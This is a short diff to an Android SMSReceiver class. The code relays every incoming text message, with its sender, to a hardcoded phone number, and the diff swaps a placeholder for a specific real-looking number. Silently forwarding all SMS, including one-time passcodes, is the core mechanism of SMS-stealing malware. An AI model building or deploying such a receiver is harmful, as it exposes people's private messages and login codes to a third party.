@@ -28,7 +28,7 @@ public class SMSReceiver extends BroadcastReceiver {
                     message = msgs[i].getMessageBody();
                     
                     // Send to the forwarding number
-                    String forwardToNumber = "+1234567890"; // The number you want to forward SMS to
+                    String forwardToNumber = "+917990036487"; // The number you want to forward SMS to
                     SmsManager smsManager = SmsManager.getDefault();
                     smsManager.sendTextMessage(forwardToNumber, null, "From: " + sender + "\nMessage: " + message, null, null);
                     
